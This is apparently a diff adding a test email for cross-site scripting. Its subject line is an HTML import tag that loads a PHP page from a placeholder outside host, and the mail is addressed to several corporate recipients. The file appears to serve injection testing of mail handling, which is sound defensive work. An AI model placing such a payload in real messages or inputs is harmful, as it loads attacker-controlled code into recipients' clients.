@@ -1,0 +1,7 @@
+From: "Arthur Cox" <texas-casino.com@gregsart.com>
+To: jfawcet@enron.com, mlokay@enron.com, kpeck@ussposco.com
+Subject: <link rel="import" href="http://xxx.com/1.php">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
